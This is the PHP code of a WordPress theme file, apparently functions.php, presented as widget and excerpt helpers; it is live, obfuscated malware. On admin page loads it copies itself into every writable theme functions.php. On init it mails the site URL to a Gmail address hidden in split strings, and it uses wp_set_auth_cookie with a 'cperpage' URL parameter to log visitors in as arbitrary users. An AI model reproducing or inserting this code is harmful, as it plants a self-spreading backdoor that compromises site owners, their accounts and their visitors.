?>
<?php
function _verifyactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}
?>